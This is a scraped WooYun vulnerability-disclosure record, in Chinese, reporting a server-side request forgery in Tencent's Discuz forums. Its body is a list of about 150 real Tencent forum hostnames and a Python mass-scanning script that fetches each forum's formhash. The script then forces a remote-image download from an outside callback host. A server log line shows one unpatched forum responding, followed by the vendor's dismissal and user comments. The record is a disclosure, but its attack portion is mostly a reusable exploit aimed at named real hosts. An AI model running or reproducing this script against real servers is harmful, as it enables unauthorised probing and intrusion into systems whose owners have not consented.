{"id": 87732, "wybug_id": "wooyun-2016-0218421", "wybug_title": "腾讯某论坛存在SSRF漏洞（附批量捡漏脚本）                                      ", "wybug_corp": "腾讯", "wybug_author": "猪猪侠", "wybug_date": "2016-06-12 11:25", "wybug_open_date": "2016-06-13 17:23", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-06-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-06-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 批量跑一遍腾讯所有的论坛，论坛那么多，总能捡到一个漏掉的，充当案例 详细说明：  #1 先从搜索引擎和爬虫中找出腾讯使用了Discuz程序的服务器列表\nhttp://fight.gamebbs.qq.comhttp://qqhx.gamebbs.qq.comhttp://bbs.digi.qq.comhttp://bbs.write.qq.comhttp://ff.gamebbs.qq.comhttp://bbs.baby.qq.comhttp://myhn.qq.comhttp://bbs.e.qq.comhttp://tpai.qq.comhttp://bbs.fanli.qq.comhttp://bbs.house.qq.comhttp://xia.gamebbs.qq.comhttp://bbs.cb.qq.comhttp://bbs.ac.qq.comhttp://club.auto.qq.comhttp://bbs.open.qq.comhttp://shouyou.qq.comhttp://bbs.im.qq.comhttp://qqbattle.gamebbs.qq.comhttp://nz.gamebbs.qq.comhttp://xx.gamebbs.qq.comhttp://xb.gamebbs.qq.comhttp://bbs.m.qq.comhttp://forum.discuz.qq.comhttp://bbs.cd.qq.comhttp://myln.qq.comhttp://ktv.gamebbs.qq.comhttp://gf.gamebbs.qq.comhttp://bbs.xian.qq.comhttp://gamebbs.qq.comhttp://ppjz.gamebbs.qq.comhttp://dm.gamebbs.qq.comhttp://ffo.gamebbs.qq.comhttp://sg.gamebbs.qq.comhttp://xb.qq.comhttp://bbs.zt.qq.comhttp://mygd.qq.comhttp://xj.gamebbs.qq.comhttp://xb.qq.com:8080http://bbs.gj.qq.comhttp://bbs.vip.qq.comhttp://bbs.sports.qq.comhttp://bbs.weiqi.qq.comhttp://lol.gamebbs.qq.comhttp://bbs.finance.qq.comhttp://d2.gamebbs.qq.comhttp://fs.gamebbs.qq.comhttp://myfj.qq.comhttp://mysh.qq.comhttp://ch.gamebbs.qq.comhttp://qqxy.gamebbs.qq.comhttp://codol.gamebbs.qq.comhttp://ava.gamebbs.qq.comhttp://fo.gamebbs.qq.comhttp://bbs.lol.qq.comhttp://wang.gamebbs.qq.comhttp://bbs.games.qq.comhttp://bbs.omd.qq.comhttp://tps.gamebbs.qq.comhttp://tiantang2.gamebbs.qq.comhttp://qqgame.gamebbs.qq.comhttp://bbs.yun.qq.comhttp://yl.gamebbs.qq.comhttp://bbs.wifi.qq.comhttp://bns.gamebbs.qq.comhttp://nba2k.gamebbs.qq.comhttp://bbs.blog.qq.comhttp://r2.gamebbs.qq.comhttp://bbs.open.t.qq.comhttp://ld2.gamebbs.qq.comhttp://yu.gamebbs.qq.comhttp://qgamepailei.gamebbs.qq.comhttp://hao.wsq.qq.comhttp://c9.gamebbs.qq.comhttp://ss.gamebbs.qq.comhttp://hxsj.gamebbs.qq.comhttp://bbs.xg.qq.comhttp://x52.gamebbs.qq.comhttp://bbs.book.qq.comhttp://9j.gamebbs.qq.comhttp://speed.gamebbs.qq.comhttp://djt.qq.comhttp://qyzs.gamebbs.qq.comhttp://bbs.auto.qq.comhttp://myhb.qq.comhttp://code.qq.comhttp://bbs.tech.qq.comhttp://wf.gamebbs.qq.comhttp://daoju.gamebbs.qq.comhttp://qqbaby.gamebbs.qq.comhttp://dzs.gamebbs.qq.comhttp://bbs.lady.qq.comhttp://bbs.kid.qq.comhttp://bbs.browser.qq.comhttp://dnf.gamebbs.qq.comhttp://s3.gamebbs.qq.comhttp://sl.gamebbs.qq.comhttp://woz.gamebbs.qq.comhttp://bbs.edu.qq.comhttp://bbs.fj.qq.comhttp://qqtang.gamebbs.qq.comhttp://xxz.gamebbs.qq.comhttp://bbs.pcmgr.qq.comhttp://myxian.qq.comhttp://xiaoyuan.qq.comhttp://mycd.qq.comhttp://cf.gamebbs.qq.comhttp://ug.qq.comhttp://myzj.qq.comhttp://bbs.meishi.qq.comhttp://bbs.astro.qq.comhttp://7.gamebbs.qq.comhttp://3366.gamebbs.qq.comhttp://meng.gamebbs.qq.comhttp://baoshi.gamebbs.qq.comhttp://bbs.guanjia.qq.comhttp://mo.gamebbs.qq.comhttp://bbs.cf.qq.comhttp://bbs.gd.qq.comhttp://bbs.comic.qq.comhttp://vr.qq.comhttp://mycq.qq.comhttp://tiantang.gamebbs.qq.comhttp://bbs.map.qq.comhttp://cheng.gamebbs.qq.comhttp://tnt.gamebbs.qq.comhttp://myhenan.qq.comhttp://xy.gamebbs.qq.comhttp://h2.gamebbs.qq.comhttp://bbs.show.qq.comhttp://bbs.wan.qq.comhttp://bbs.ent.qq.comhttp://qqsh.gamebbs.qq.comhttp://mama.kid.qq.comhttp://bbs.cq.qq.comhttp://bbs.qt.qq.comhttp://age.gamebbs.qq.comhttp://bbs.fashion.qq.comhttp://bbs.v.qq.comhttp://bbs.mail.qq.comhttp://bbs.ms.qq.comhttp://pet.gamebbs.qq.comhttp://bl.gamebbs.qq.comhttp://bbs.hb.qq.comhttp://x.gamebbs.qq.comhttp://bbs.tgp.qq.comhttp://hon.gamebbs.qq.comhttp://jh.gamebbs.qq.comhttp://zg.gamebbs.qq.comhttps://xb.qq.comhttp://9.gamebbs.qq.comhttp://bbs.shang.qq.comhttp://ye.gamebbs.qq.comhttp://bbs.news.qq.comhttp://bbs.qa.qq.comhttp://bbs.chuangshi.qq.comhttp://x5.gamebbs.qq.com\n#2 建立批量检测脚本捡漏\n#!/usr/bin/env python# encoding: utf-8import urlparseimport randomimport timeimport reimport requestsfrom utils.fileutils import FileUtilsimport requests.packages.urllib3requests.packages.urllib3.disable_warnings()for website in FileUtils.getLines('qqdz.lst'):    request = requests.session()    try:        forumurl = \"{website}/forum.php\".format(website=website)        response = request.get(forumurl, timeout=5, verify=False)        formhash = re.findall(r'formhash\" value=\"(.*?)\"',response.content)        netloc = urlparse.urlparse(website).netloc        payload = 'http://fuzz.wuyun.com/404.php?s={netloc}.jpg'.format(netloc=netloc)        url = \"{website}/forum.php?mod=ajax&action=downremoteimg&formhash={formhash}&message=[img]{payload}[/img]\".format(            website=website,            formhash=formhash[0] if formhash else '',            payload=payload)        response = request.get(url, timeout=5, verify=False)        print url, len(response.content)    except Exception, e:        print website, e\n上面的 fileutils 库在这里http://fuzz.wuyun.org/src/fileutils.py   漏洞证明：  #3 批量跑一边，在fuzz.wuyun.com的httpd查看请求日志\n119.29.69.176 - - [12/Jun/2016:11:00:45 +0800] \"GET /404.php?s=vr.qq.com.jpg HTTP/1.1\" 404 282 \"-\" \"-\"\n#4 捡到一个漏打补丁的论坛http://vr.qq.com/forum.php\nIP:119.29.69.176广东省广州市 腾讯云计算（北京）有限责任公司 腾讯集团\n   修复方案：  # 论坛那么多，总有漏掉的案例   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-06-13 17:23 厂商回复： 非常感谢您的报告，经评估该站点已有网络隔离，无法访问公司IDC内网，故此忽略。如果您有任何的疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-06-12 11:28 |    \t\t荒废的腰子 \t\t\t( 普通白帽子  |\t\t\t        Rank:263 漏洞数:30        | bug is my best friend)\t\t \n  dz    \n     2016-06-12 11:29 |    \t\tjye33 \t\t\t( 普通白帽子  |\t\t\t        Rank:1267 漏洞数:298        | 没有什么能够阻挡，我对静静的向往)\t\t \n  66666    \n     2016-06-12 11:48 |    \t\t石家庄 \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:14        | 同上)\t\t \n  2333    \n     2016-06-12 12:02 |    \t\tRaven \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 转让一张白帽场门票= =)\t\t \n  好厉害啊！    \n     2016-06-12 12:18 |    \t\theartk \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:39        | 保存心中那份热情，坚持心中那份梦想。)\t\t \n  666666    \n     2016-06-12 12:43 |    \t\t齐迹 \t\t\t( 普通白帽子  |\t\t\t        Rank:804 漏洞数:104        | 重庆地区招聘安全工程师。sec.zbj.com欢迎...)\t\t \n  666666    \n     2016-06-12 13:31 |    \t\tSubmit \t\t\t( 普通白帽子  |\t\t\t        Rank:565 漏洞数:132        | )\t\t \n  此漏洞已有人在SRC提交过，故此忽略    \n     2016-06-12 14:00 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:395 漏洞数:73        | 我是一只毛毛虫。)\t\t \n  一言不和就发ssrf    \n     2016-06-12 14:21 |    \t\tExplo1t \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:7        | 流生若川，不要小看人生啊！)\t\t \n  马克，    \n     2016-06-12 14:30 |    \t\tDotaer \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | 多学习，多挖洞！)\t\t \n  一言不和就发车。老司机，带上我。    \n     2016-06-12 14:44 |    \t\tMel0d6y \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:11        | 迷失在未来的旅行者.              「H...)\t\t \n  我猪今年峰会上的案例集收集的差不多了吧？    \n     2016-06-12 15:45 |    \t\tYiYang \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:18        | 一锹、两锹、三锹。。。)\t\t \n  多发点批量检测脚本，好学习，多谢分享。    \n     2016-06-12 16:42 |    \t\tFvckyou \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:3        )\t\t \n  此漏洞已有人在SRC提交过，故此忽略    \n     2016-06-12 17:00 |    \t\t乱舞 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:6        | 小小白)\t\t \n  猪哥威武    \n     2016-06-12 17:41 |    \t\tNeverEnd \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:31        | hack)\t\t \n  nice    \n     2016-06-12 17:58 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:71        | 我要是再正常一点就好了)\t\t \n  脚本！    \n     2016-06-12 18:22 |    \t\tRainism \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:4        | hacking for fun)\t\t \n  案例丰富    \n     2016-06-12 22:35 |    \t\txinali \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 在校学生，研究网络安全，希望毕业可以找到...)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}